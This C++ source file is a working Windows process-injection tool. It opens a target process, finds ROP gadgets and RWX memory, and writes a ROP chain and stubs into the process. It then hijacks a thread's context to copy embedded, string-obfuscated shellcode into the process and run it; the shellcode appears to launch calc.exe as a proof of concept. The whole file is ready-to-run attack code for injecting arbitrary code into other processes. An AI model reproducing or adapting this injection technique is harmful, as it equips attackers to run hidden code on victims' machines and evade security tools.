#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <vector>
#include <iomanip>
#include "debugprivcheck.h"
#include "findgadget.h"
#include "FindRWXMemoryRegions.h"

#pragma comment(lib, "psapi.lib")

unsigned char shellcode_base[] =
{ 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x48, 0x31, 0xc9, 0x65, 0x48, 0x8b, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x40, 0x60, 0x48, 0x8b, 0x40, 0x18, 0x48, 0x8b, 0x70, 0x10, 0x48, 0x8b, 0x36, 0x48, 0x8b, 0x4e, 0x60, 0x48, 0x8b, 0x19, 0x48, 0xba, 0x4b, 0x00, 0x45, 0x00, 0x52, 0x00, 0x4e, 0x00, 0x48, 0x39, 0xd3, 0x74, 0x02, 0x75, 0xe5, 0x48, 0x8b, 0x5e, 0x30, 0x49, 0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff, 0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x44, 0x8b, 0x52, 0x14, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01, 0xc3, 0x4c, 0x89, 0xd1, 0x48, 0xb8, 0xa8, 0x96, 0x91, 0xba, 0x87, 0x9a, 0x9c, 0x6f, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe0, 0x08, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x48, 0x89, 0xe0, 0x48, 0x83, 0xc4, 0x08, 0x67, 0xe3, 0x16, 0x31, 0xdb, 0x41, 0x8b, 0x1c, 0x8b, 0x4c, 0x01, 0xc3, 0x48, 0xff, 0xc9, 0x4c, 0x8b, 0x08, 0x4c, 0x39, 0x0b, 0x74, 0x03, 0x75, 0xe7, 0xcc, 0xff, 0xc1, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x1c, 0x4d, 0x01, 0xc3, 0x45, 0x8b, 0x3c, 0x8b, 0x4d, 0x01, 0xc7, 0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1, 0x48, 0x31, 0xd2, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x30, 0x41, 0xff, 0xd7 };

char forever;

DWORD FindThreadId(DWORD pid) {
    THREADENTRY32 te{};
    te.dwSize = sizeof(te);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE)
        return 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                CloseHandle(snap);
                return te.th32ThreadID;
            }
        } while (Thread32Next(snap, &te));
    }

    CloseHandle(snap);
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cout << "Usage: " << argv[0] << " <process_pid>\n";
        return 1;
    }

    if (EnableDebugPrivilege()) {
        printf("[+] Debug privilege enabled successfully!\n");
    }
    else {
        printf("[-] Likely running in [Medium] integrity so debugpriv not needed...\n");
    }

    DWORD pid = (DWORD)atoi(argv[1]);
    std::wcout << L"[*] Target PID: " << pid << std::endl;

    // Find gadgets (in order of execution)
    BYTE gadget0[] = { 0xC3 }; // ret
    PVOID pgadget0 = FindGadget(pid, gadget0, sizeof(gadget0), "ret");
    if (!pgadget0)
    {
        std::wcout << L"[-] Could not locate any gadgets for: ret" << std::endl;
        return 1;
    }
    BYTE gadget3[] = { 0x4C, 0x89, 0x00, 0xC3 }; // mov [rax], r8; ret
    PVOID pgadget3 = FindGadget(pid, gadget3, sizeof(gadget3), "mov [rax], r8; ret");
    if (!pgadget3)
    {
        std::wcout << L"[-] Could not locate any gadgets for mov [rax], r8; ret" << std::endl;
        return 1;
    }
    BYTE gadget12[] = { 0x5C, 0xC3 }; // pop rsp; ret  (go with a non-volatile register)
    PVOID pgadget12 = FindGadget(pid, gadget12, sizeof(gadget12), "pop rsp; ret ");
    if (!pgadget12)
    {
        std::wcout << L"[-] Could not locate any gadgets for pop rsp; ret " << std::endl;
        return 1;
    }
   
    // Open process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::wcout << L"[!] Failed to open process (Error: " << GetLastError() << L")" << std::endl;
        return 1;
    }

    std::wcout << L"[+] Successfully opened process handle" << std::endl;

    LPVOID remoteShellcode = nullptr;
    LPVOID remoteGadgets = nullptr;
    LPVOID remoteStack = nullptr;
    // Find all RWX memory regions
    std::wcout << L"\n[*] Scanning for RWX memory regions..." << std::endl;

    int reval=FindRWXMemoryRegions(shellcode_base, hProcess, remoteShellcode, remoteGadgets, remoteStack);

    SIZE_T bytesWritten2;
    // Set stack pointer near the TOP to allow plenty of room 
    LPVOID safeStack = (LPVOID)((uintptr_t)remoteStack + 0x3F00);

    // Write shellcode address to this location
    if (!WriteProcessMemory(hProcess, safeStack, &remoteShellcode, sizeof(void*), &bytesWritten2)) {
        std::cout << "There was an error writing the shellcode address to the fake stack.  Try selecting another memory region\n";
    }
    std::cin.get();

    //******************************
    // Hijack a thread
    //******************************

    DWORD tid = FindThreadId(pid);
    if (!tid) {
        std::cerr << "Failed to find thread\n";
        return 1;
    }
    else
    {
        std::cout << "Thread Id found!  ThreadID:" << tid << std::endl;
    }

    HANDLE hThread = OpenThread(
        THREAD_ALL_ACCESS,
        FALSE,
        tid
    );

    if (!hThread) {
        std::cerr << "OpenThread failed\n";
        return 1;
    }

//**********************************************************
// ROP Gadgets Prepwork
//**********************************************************
    std::wcout << L"\n[*] Building ROP chain with code caves..." << std::endl;

    // Calculate sizes
    size_t addr_size = sizeof(void*);
    size_t base_size = sizeof(shellcode_base);
    unsigned char* shellcode = shellcode_base;

    // Calculate number of 8-byte chunks
    size_t numChunks = (base_size + 7) / 8;
    std::wcout << L"[*] Shellcode size: " << base_size << L" bytes ("
        << numChunks << L" chunks)" << std::endl;

    // Allocate memory for code stubs within gadgets region
    // Each stub needs ~21 bytes, opting to use 32 for safety and alignment
    SIZE_T stubsSize = numChunks * 32;
    LPVOID codeStubs = (LPVOID)((uintptr_t)remoteGadgets + 0x800); // Offset within gadgets region

    std::wcout << L"[*] Code stubs will be at: 0x" << std::hex << codeStubs << std::dec << std::endl;

    //********************************************
    // Build ROP chain
    //********************************************
    std::vector<DWORD64> ropChain;
    uintptr_t stubAddr = (uintptr_t)codeStubs;

    for (size_t i = 0; i < numChunks; i++) {
        if (i > 0) {  // Skip first stub in ROP chain (executed via RIP)
            ropChain.push_back(stubAddr);
        }
        ropChain.push_back((DWORD64)pgadget3);     // mov [rax], r8; ret
        stubAddr += 32;
    }
   
    // After all the write gadgets...
    ropChain.push_back((DWORD64)pgadget12);  // pop rsp; ret  
    ropChain.push_back((DWORD64)safeStack);  // Set RSP to safe stack
    // Now ret will pop the remoteShellcode address from safeStack + 0x3F00 and jump to the shellcode!

    std::wcout << L"[*] ROP chain: " << ropChain.size() << " entries" << std::endl;
    //********************************************

    // Write ROP chain to start of gadgets region
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteGadgets, ropChain.data(),
        ropChain.size() * sizeof(DWORD64), &bytesWritten)) {
        std::wcout << L"[!] WriteProcessMemory (ROP chain) failed: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    std::wcout << L"[+] ROP chain written! (" << bytesWritten << L" bytes)" << std::endl;
    std::cin.get();

    //*************************************************
    // Generate assembly stubs to set R8 and RAX
    //*************************************************
    std::wcout << L"\n[*] Generating code stubs..." << std::endl;

    std::vector<unsigned char> allStubs;
    uintptr_t writeAddr = (uintptr_t)remoteShellcode;

    for (size_t i = 0; i < numChunks; i++) {
        // Extract 8-byte chunk from shellcode
        uint64_t chunk = 0;
        size_t bytesToCopy = min(8, base_size - (i * 8));
        memcpy(&chunk, shellcode_base + (i * 8), bytesToCopy);

        // Build stub:
        // mov r8, <chunk>      ; 10 bytes: 49 B8 [qword]
        // mov rax, <writeAddr> ; 10 bytes: 48 B8 [qword]
        // ret                  ; 1 byte:  C3

        unsigned char stub[32] = { 0 };
        int offset = 0;

        // mov r8, imm64
        stub[offset++] = 0x49;
        stub[offset++] = 0xB8;
        memcpy(&stub[offset], &chunk, 8);
        offset += 8;

        // mov rax, imm64
        stub[offset++] = 0x48;
        stub[offset++] = 0xB8;
        memcpy(&stub[offset], &writeAddr, 8);
        offset += 8;

        // ret
        stub[offset++] = 0xC3;

        // Pad with NOPs
        for (int j = offset; j < 32; j++) {
            stub[j] = 0x90;
        }

        allStubs.insert(allStubs.end(), stub, stub + 32);

        std::wcout << L"[+] Stub " << i << L": R8=0x" << std::hex << chunk
            << L", RAX=0x" << writeAddr << std::dec << std::endl;

        writeAddr += 8;
    }

    // Write stubs to gadgets region
    if (!WriteProcessMemory(hProcess, codeStubs, allStubs.data(),
        allStubs.size(), &bytesWritten)) {
        std::wcout << L"[!] WriteProcessMemory (stubs) failed: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }
    std::wcout << L"[+] Code stubs written (" << bytesWritten << L" bytes)" << std::endl;

    //*************************************************
    // Set up thread context and execute
    //*************************************************
    std::wcout << L"\n[*] Setting up thread context..." << std::endl;

    if (SuspendThread(hThread) == (DWORD)-1) {
        std::wcout << L"[!] SuspendThread failed: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_ALL;

    if (!GetThreadContext(hThread, &ctx)) {
        std::wcout << L"[!] GetThreadContext failed: " << GetLastError() << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    // Set initial state
    ctx.Rip = (DWORD64)codeStubs;           // Start at first stub
    ctx.Rsp = (DWORD64)remoteGadgets;       // Stack points to ROP chain
   // ctx.R12 = (DWORD64)remoteShellcode;     // memory address for gadget-written Shellcode 

    if (!SetThreadContext(hThread, &ctx)) {
        std::wcout << L"[!] SetThreadContext failed: " << GetLastError() << std::endl;
        ResumeThread(hThread);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    std::wcout << L"[+] Thread context set:" << std::endl;
    std::wcout << L"    RIP = 0x" << std::hex << ctx.Rip << L" (first stub)" << std::endl;
    std::wcout << L"    RSP = 0x" << ctx.Rsp << L" (ROP chain)" << std::endl;
    //std::wcout << L"    R12  = 0x" << ctx.R12 << L" (shellcode entry)" << std::dec << std::endl;

    std::wcout << L"\n[!] Press ENTER to execute ROP chain..." << std::endl;
    std::cin.get();

     // Execute!
    if (ResumeThread(hThread) == (DWORD)-1) {
        std::wcout << L"[!] ResumeThread failed: " << GetLastError() << std::endl;
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 1;
    }

    std::wcout << L"[+] ROP chain executing!" << std::endl;
    std::wcout << L"[*] Waiting for shellcode to complete..." << std::endl;
    std::wcout << L"[+] Execution complete!" << std::endl;

    return 0;
}